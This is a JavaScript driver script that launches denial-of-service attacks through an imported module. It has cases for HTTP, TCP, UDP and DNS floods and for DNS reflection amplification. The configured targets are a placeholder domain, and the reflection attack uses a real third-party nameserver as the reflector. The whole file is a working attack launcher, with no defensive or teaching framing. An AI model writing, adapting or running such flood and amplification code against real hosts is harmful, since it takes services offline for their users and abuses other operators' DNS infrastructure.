const attacks = require('.');

const url = "https://evil-code-generator.com/"
const host = "evil-code-generator.com"
const attackType = "dnsRA"

function attack(type) {
  switch (type) {
    case "http":
      const httpFloodPayload = {
        url, threads: 10, timeout: 1000, duration: 5000,
      };
      attacks.httpFlood(httpFloodPayload);
      break;
    case "tcp":
      const tcpFloodPayload = {
        host, port: 1337, threads: 10, timeout: 1000, duration: 5000,
      };
      attacks.tcpFlood(tcpFloodPayload);
      break;
    case "udp":
      const udpFloodPayload = {
        host, port: 31091, threads: 10, timeout: 1000, duration: 5000,
      };
      attacks.udpFlood(udpFloodPayload);
      break;
    case "dnsRA":
      const dnsRAPayload = {
        targetIP : "127.0.0.1", dnsServer:"ns1.ovh.com", port: 53, threads: 10, timeout: 1000, duration: 5000,
      };
      attacks.dnsReflectionAmplification(dnsRAPayload);
      break;
      case "dns":
        const dnsFloodPayload = {
          host, threads: 10, timeout: 1000, duration: 5000,
        };
        attacks.dnsFlood(dnsFloodPayload);
        break;
    default:
      break;
  }
}

try {
  attack(attackType)
} catch (error) {
  console.log(attackType, "error : ", error)
}









